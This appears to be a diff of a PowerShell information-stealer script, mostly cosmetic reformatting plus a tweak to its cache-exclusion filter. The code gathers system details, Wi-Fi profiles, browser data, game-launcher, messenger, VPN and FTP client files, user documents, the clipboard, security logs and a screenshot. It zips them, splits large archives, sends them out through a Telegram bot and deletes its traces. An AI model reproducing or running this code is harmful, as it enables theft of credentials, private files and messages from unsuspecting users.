@@ -34,7 +34,6 @@ function Split-File {
     $ext = [System.IO.Path]::GetExtension($FilePath)
     $dir = [System.IO.Path]::GetDirectoryName($FilePath)
     $parts = @()
-    
     $f = [System.IO.File]::OpenRead($FilePath)
     try {
         $partIdx = 1
@@ -43,24 +42,19 @@ function Split-File {
             $out = [System.IO.File]::Create($partName)
             $written = 0
             $buf = New-Object byte[] $bufSize
-            
             while ($written -lt $maxBytes -and $f.Position -lt $f.Length) {
                 $toRead = [Math]::Min($bufSize, $maxBytes - $written)
                 $r = $f.Read($buf, 0, $toRead)
                 if ($r -gt 0) { 
                     $out.Write($buf, 0, $r)
                     $written += $r 
-                } else { 
-                    break 
-                }
+                } else { break }
             }
             $out.Close()
             $parts += $partName
             $partIdx++
         }
-    } finally { 
-        $f.Close() 
-    }
+    } finally { $f.Close() }
     return $parts
 }
 
@@ -71,7 +65,6 @@ function Send-ResultToTelegram {
         [string]$ZipPath,
         [string]$Caption
     )
-    
     $url = "https://api.telegram.org/bot$BotToken/sendDocument"
     try {
         Add-Type -AssemblyName System.Net.Http
@@ -79,44 +72,26 @@ function Send-ResultToTelegram {
         $fileName = [System.IO.Path]::GetFileName($ZipPath)
         $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
         $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
-        
         $form = New-Object System.Net.Http.MultipartFormDataContent
         $form.Add($fileContent, "document", $fileName)
         $form.Add((New-Object System.Net.Http.StringContent($ChatID)), "chat_id")
-        if ($Caption) {
-            $form.Add((New-Object System.Net.Http.StringContent($Caption)), "caption")
-        }
-        
+        if ($Caption) { $form.Add((New-Object System.Net.Http.StringContent($Caption)), "caption") }
         $client = New-Object System.Net.Http.HttpClient
         $response = $client.PostAsync($url, $form).Result
         $statusCode = $response.StatusCode
         $response.Content.ReadAsStringAsync().Result | Out-Null
-        
         $fileStream.Dispose()
         $form.Dispose()
         $client.Dispose()
-        
-        if ($statusCode -eq [System.Net.HttpStatusCode]::OK) {
-            return $true
-        } else {
-            return $false
-        }
-    } catch {
-        return $false
-    }
+        if ($statusCode -eq [System.Net.HttpStatusCode]::OK) { return $true } else { return $false }
+    } catch { return $false }
 }
 
 function Get-SystemInfo {
     param([string]$OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-    
     $ipConfig = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Select-Object -ExpandProperty IPAddress
-    $externalIp = try { 
-        (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 5 -ErrorAction Stop).Trim() 
-    } catch { 
-        "N/A" 
-    }
-    
+    $externalIp = try { (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 5 -ErrorAction Stop).Trim() } catch { "N/A" }
     $localIPStr = ($ipConfig -join ", ")
     $userInfo = @"
 Username: $($env:USERNAME)
@@ -125,12 +100,10 @@ Local IP: $localIPStr
 External IP: $externalIp
 "@
     $userInfo | Out-File "$OutDirectory\user_info.txt" -Force -Encoding UTF8
-    
     try {
         $osInfo = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
         $cpuInfo = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue
         $sysInfo = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
-        
         $sysInfoStr = @"
 OS: $($osInfo.Caption)
 Version: $($osInfo.Version)
@@ -140,14 +113,12 @@ CPU: $($cpuInfo.Name)
 "@
         $sysInfoStr | Out-File "$OutDirectory\computer_info.txt" -Force -Encoding UTF8
     } catch {}
-    
     try {
         Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue |
             Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
             Format-Table -AutoSize |
             Out-File "$OutDirectory\installed_programs.txt" -Force -Encoding UTF8
     } catch {}
-    
     try {
         $wifiProfiles = (netsh wlan show profiles 2>$null) | Select-String ":(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
         $wifiData = @()
@@ -169,19 +140,16 @@ CPU: $($cpuInfo.Name)
 function Get-BrowserData {
     param([string]$OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-    
     $chromiumDir = "$OutDirectory\Chromium"
     $firefoxDir = "$OutDirectory\Firefox"
     New-Item -Path $chromiumDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
     New-Item -Path $firefoxDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-    
     $browsers = @(
         @{Path="$env:LOCALAPPDATA\Google\Chrome\User Data"; Name="Chrome"},
         @{Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data"; Name="Edge"},
         @{Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; Name="Brave"},
         @{Path="$env:LOCALAPPDATA\Opera\Opera Stable"; Name="Opera"}
     )
-    
     foreach ($browser in $browsers) {
         if (Test-Path $browser.Path) {
             $browserOutDir = "$chromiumDir\$($browser.Name)"
@@ -194,7 +162,6 @@ function Get-BrowserData {
             } catch {}
         }
     }
-    
     $profilesIni = "$env:APPDATA\Mozilla\Firefox\profiles.ini"
     if (Test-Path $profilesIni) {
         try {
@@ -219,13 +186,12 @@ function Get-BrowserData {
 function Gather-Files {
     param([string]$OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-    
+    $excludePatterns = '\Cache\', '\Code Cache\', '\GPUCache\', '\Service Worker\', '\Local Storage\', '\Session Storage\', '\AppData\Local\Temp\', '\AppData\Roaming\Temp\', '\AppData\Local\Google\Chrome\User Data\Default\Cache\'
     $userDirs = @(
         "$env:USERPROFILE\Desktop",
         "$env:USERPROFILE\Documents",
         "$env:USERPROFILE\Downloads"
     )
-    
     foreach ($dir in $userDirs) {
         if (Test-Path $dir) {
             try {
@@ -234,7 +200,7 @@ function Gather-Files {
                         $_.Length -lt 20MB -and
                         $_.Attributes -notmatch "System" -and
                         $_.Name -notmatch "(?:pagefile|swapfile|\.tmp$|\.log$)" -and
-                        $_.FullName -notmatch "\\Cache\\|\\Code Cache\\|\\GPUCache\\|\\Service Worker\\|\\Local Storage\\|\\Session Storage\\"
+                        $excludePatterns -notcontains $_.FullName
                     } | ForEach-Object {
                     try {
                         Copy-Item $_.FullName -Destination "$OutDirectory\" -Force -ErrorAction SilentlyContinue
@@ -248,14 +214,12 @@ function Gather-Files {
 function Get-GameLauncherData {
     param([string]$OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-    
     $gamePaths = @(
         "$env:APPDATA\Steam",
         "$env:LOCALAPPDATA\Epic Games",
         "$env:APPDATA\GOG.com",
         "$env:LOCALAPPDATA\DayZ"
     )
-    
     foreach ($gamePath in $gamePaths) {
         if (Test-Path $gamePath) {
             $gameName = Split-Path $gamePath -Leaf
@@ -269,7 +233,6 @@ function Get-GameLauncherData {
 function Get-MessengerData {
     param([string]$OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-    
     $messengerPaths = @(
         "$env:APPDATA\Discord",
         "$env:LOCALAPPDATA\Telegram Desktop",
@@ -277,7 +240,6 @@ function Get-MessengerData {
         "$env:APPDATA\WhatsApp",
         "$env:LOCALAPPDATA\Viber"
     )
-    
     foreach ($messengerPath in $messengerPaths) {
         if (Test-Path $messengerPath) {
             $messengerName = Split-Path $messengerPath -Leaf
@@ -305,14 +267,12 @@ function Take-Screenshot {
 function Get-UserActivity {
     param([string]$OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-    
     try {
         $clipboard = Get-Clipboard -ErrorAction SilentlyContinue
         if ($clipboard) {
             $clipboard | Out-File "$OutDirectory\clipboard.txt" -Force -Encoding UTF8
         }
     } catch {}
-    
     try {
         Get-EventLog -LogName Security -Newest 1000 -ErrorAction SilentlyContinue |
             Export-Csv "$OutDirectory\security_events.csv" -Force -Encoding UTF8
@@ -322,10 +282,8 @@ function Get-UserActivity {
 function Get-VpnFtpData {
     param([string]$OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-    
     $vpnDir = "$OutDirectory\VPN_Configs"
     New-Item -Path $vpnDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-    
     $searchDirs = @(
         "$env:USERPROFILE\Downloads",
         "$env:USERPROFILE\Documents",
@@ -334,7 +292,6 @@ function Get-VpnFtpData {
         "$env:APPDATA\OpenVPN Connect",
         "$env:APPDATA\ProtonVPN"
     )
-    
     foreach ($dir in $searchDirs) {
         if (Test-Path $dir) {
             try {
@@ -348,10 +305,8 @@ function Get-VpnFtpData {
             } catch {}
         }
     }
-    
     $ftpDir = "$OutDirectory\FTP_Clients"
     New-Item -Path $ftpDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-    
     $ftpPaths = @(
         "$env:APPDATA\FileZilla",
         "$env:APPDATA\WinSCP.ini",
@@ -359,7 +314,6 @@ function Get-VpnFtpData {
         "$env:APPDATA\Cyberduck",
         "$env:APPDATA\SmartFTP"
     )
-    
     foreach ($ftpPath in $ftpPaths) {
         if (Test-Path $ftpPath) {
             try {
@@ -373,37 +327,25 @@ function Start-Execution {
     WriteMsg "Start"
     $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
     New-Item -Path $tempDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-
     WriteMsg "SystemCollect"
     Get-SystemInfo -OutDirectory "$tempDir\System"
-    
     WriteMsg "BrowsersCollect"
     Get-BrowserData -OutDirectory "$tempDir\Browsers"
-    
     WriteMsg "FilesCollect"
     Gather-Files -OutDirectory "$tempDir\Files"
-    
     WriteMsg "GamingCollect"
     Get-GameLauncherData -OutDirectory "$tempDir\Gaming"
-    
     WriteMsg "MessengersCollect"
     Get-MessengerData -OutDirectory "$tempDir\Messengers"
-    
     WriteMsg "UserActivity"
     Get-UserActivity -OutDirectory "$tempDir\Activity"
-    
     WriteMsg "NetworkCollect"
     Get-VpnFtpData -OutDirectory "$tempDir\Network"
-
     WriteMsg "Screenshot"
     Take-Screenshot -OutFile "$tempDir\screenshot.png"
-
     WriteMsg "Archive"
     $zipPath = "$env:TEMP\DataPackage-$(Get-Random).zip"
-    if (Test-Path $zipPath) { 
-        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue 
-    }
-    
+    if (Test-Path $zipPath) { Remove-Item $zipPath -Force -ErrorAction SilentlyContinue }
     try {
         [System.IO.Compression.ZipFile]::CreateFromDirectory(
             $tempDir,
@@ -416,56 +358,32 @@ function Start-Execution {
         Remove-Item -Path $tempDir -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
         return
     }
-
     $zipSizeMB = [Math]::Round((Get-Item $zipPath -ErrorAction SilentlyContinue).Length / 1MB, 2)
-    
     WriteMsg "TelegramSend"
-    
     $systemInfoPath = "$tempDir\System\user_info.txt"
     $caption = ""
-    
     if (Test-Path $systemInfoPath) {
-        try {
-            $caption = Get-Content $systemInfoPath -Raw -ErrorAction Stop
-        } catch {
-            $caption = "System info file exists but cannot be read"
-        }
+        try { $caption = Get-Content $systemInfoPath -Raw -ErrorAction Stop }
+        catch { $caption = "System info file exists but cannot be read" }
     } else {
         $caption = "System info not available"
     }
-    
     $maxTelegramMB = 49
-    
     if ($zipSizeMB -le $maxTelegramMB) {
         $ok = Send-ResultToTelegram $BotToken $ChatID $zipPath $caption
-        if ($ok) { 
-            WriteMsg "Success" 
-        } else { 
-            WriteMsg "FailSend" 
-        }
+        if ($ok) { WriteMsg "Success" } else { WriteMsg "FailSend" }
     } else {
         $parts = Split-File -FilePath $zipPath -PartSizeMB $maxTelegramMB
         $allOk = $true
         foreach ($pt in $parts) {
             $ok = Send-ResultToTelegram $BotToken $ChatID $pt $caption
-            if (-not $ok) { 
-                $allOk = $false 
-            }
+            if (-not $ok) { $allOk = $false }
         }
-        if ($allOk) { 
-            WriteMsg "Success" 
-        } else { 
-            WriteMsg "FailSend" 
-        }
-        
-        foreach ($pt in $parts) {
-            Remove-Item -Path $pt -Force -ErrorAction SilentlyContinue
-        }
+        if ($allOk) { WriteMsg "Success" } else { WriteMsg "FailSend" }
+        foreach ($pt in $parts) { Remove-Item -Path $pt -Force -ErrorAction SilentlyContinue }
     }
-    
     Remove-Item -Path $tempDir -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
     Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
-    
     WriteMsg "Finished"
 }
 
